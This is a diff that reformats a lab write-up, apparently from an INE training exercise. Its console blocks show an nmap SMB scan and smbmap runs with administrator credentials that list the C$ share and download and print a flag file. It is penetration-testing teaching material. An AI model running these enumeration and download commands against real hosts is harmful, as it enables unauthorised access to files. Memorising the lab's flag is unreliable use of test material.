@@ -50,7 +50,8 @@ Host is up (0.0090s latency).
 
 PORT    STATE SERVICE
 445/tcp open  microsoft-ds
-                                                                                                                                                                                           
+
+
 Host script results:
 | smb-protocols: 
 |   dialects: 
@@ -80,9 +81,9 @@ Nmap done: 1 IP address (1 host up) scanned in 5.26 seconds
  SMBMap - Samba Share Enumerator v1.10.2 | Shawn Evans - ShawnDEvans@gmail.com
                      https://github.com/ShawnDEvans/smbmap
 
-[*] Detected 1 hosts serving SMB                                                                                                  
-[*] Established 1 SMB connections(s) and 1 authentidated session(s)                                                      
-                                                                                                                                            
+[*] Detected 1 hosts serving SMB
+[*] Established 1 SMB connections(s) and 1 authentidated session(s)
+
 [+] IP: 10.4.31.245:445 Name: demo.ine.local            Status: ADMIN!!!   
         Disk                                                    Permissions     Comment
         ----                                                    -----------     -------
@@ -98,7 +99,7 @@ Nmap done: 1 IP address (1 host up) scanned in 5.26 seconds
 
 ```console
 ┌──(root㉿INE)-[~]
-└─# smbmap -u administrator -p smbserver_771 -L -H demo.ine.local                                                                                                                          
+└─# smbmap -u administrator -p smbserver_771 -L -H demo.ine.local
 
     ________  ___      ___  _______   ___      ___       __         _______
    /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
@@ -111,16 +112,16 @@ Nmap done: 1 IP address (1 host up) scanned in 5.26 seconds
  SMBMap - Samba Share Enumerator v1.10.2 | Shawn Evans - ShawnDEvans@gmail.com
                      https://github.com/ShawnDEvans/smbmap
 
-[*] Detected 1 hosts serving SMB                                                                                                  
-[*] Established 1 SMB connections(s) and 1 authentidated session(s)                                                      
-[+] Host 10.4.31.245 Local Drives: C:\ D:\                                                                               
+[*] Detected 1 hosts serving SMB
+[*] Established 1 SMB connections(s) and 1 authentidated session(s)
+[+] Host 10.4.31.245 Local Drives: C:\ D:\
 [+] Host 10.4.31.245 Net Drive(s):
 [*] No mapped network drives
 ```
 
 ```console
 ┌──(root㉿INE)-[~]
-└─# smbmap -u administrator -p smbserver_771 -H demo.ine.local -r 'C$'                                                                                                                                                                    
+└─# smbmap -u administrator -p smbserver_771 -H demo.ine.local -r 'C$'
 
     ________  ___      ___  _______   ___      ___       __         _______
    /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
@@ -135,7 +136,7 @@ Nmap done: 1 IP address (1 host up) scanned in 5.26 seconds
 
 [*] Detected 1 hosts serving SMB                                                                                                  
 [*] Established 1 SMB connections(s) and 1 authentidated session(s)                                                      
-                                                                                                                                            
+
 [+] IP: 10.4.31.245:445 Name: demo.ine.local            Status: ADMIN!!!   
         Disk                                                    Permissions     Comment
         ----                                                    -----------     -------
@@ -178,15 +179,16 @@ Nmap done: 1 IP address (1 host up) scanned in 5.26 seconds
  SMBMap - Samba Share Enumerator v1.10.2 | Shawn Evans - ShawnDEvans@gmail.com
                      https://github.com/ShawnDEvans/smbmap
 
-[*] Detected 1 hosts serving SMB                                                                                                  
-[*] Established 1 SMB connections(s) and 1 authentidated session(s)                                                      
-[+] Starting download: C$\flag.txt (32 bytes)                                                                            
+[*] Detected 1 hosts serving SMB
+[*] Established 1 SMB connections(s) and 1 authentidated session(s)
+[+] Starting download: C$\flag.txt (32 bytes)
 [+] File output to: /root/10.4.31.245-C_flag.txt
 ```
 
 ```console
 ┌──(root㉿INE)-[~]
-└─# cat /root/10.4.31.245-C_flag.txt                                                                                                                                           25f492dbef8453cdca69a173a75790f0
+└─# cat /root/10.4.31.245-C_flag.txt
+25f492dbef8453cdca69a173a75790f0
 ```
 
 ---
